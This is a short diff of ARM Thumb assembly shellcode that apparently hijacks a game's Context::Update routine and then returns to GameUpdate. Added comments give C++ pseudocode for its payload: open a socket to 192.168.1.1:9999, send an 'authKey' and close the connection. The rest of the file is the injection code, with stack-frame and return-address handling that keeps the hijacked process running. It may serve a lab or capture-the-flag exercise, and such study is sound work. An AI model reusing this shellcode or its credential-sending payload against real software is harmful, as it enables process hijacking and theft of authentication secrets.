@@ -2,6 +2,15 @@
 .thumb
 .global start
 
+@ c++ code of shell
+@ int socket = api->socket(true);
+@ NetAddr addr;
+@ addr.ip = 0x0101A8C0; // 192.168.1.1
+@ addr.port = 9999;
+@ api->connect(socket, &addr);
+@ api->send(socket, authKey);
+@ api->close(socket)
+
 start:
 	@ sp + 104 is beginning of stack frame of previous function - Context::Update()
 	ldr		r4, [sp, #84]	@ at sp + 84 r5 register is stored, which contain address of Context
@@ -43,7 +52,7 @@ start:
 	blx		r5
 
 	add		sp, #300
-	sub 	r4, #252 		@ restore previous this - addres of Context
+	sub 	r4, #252 		@ restore previous this - address of Context
 
 	ldr		r5, [sp, #88]	@ at sp + 88 r6 register is stored, which contain address of GameUpdate+1
 	ldr		r6, =0x5f2		@ GameUpdate - (Context::Update() + offset), 11f0 - (be8 + 0x16)
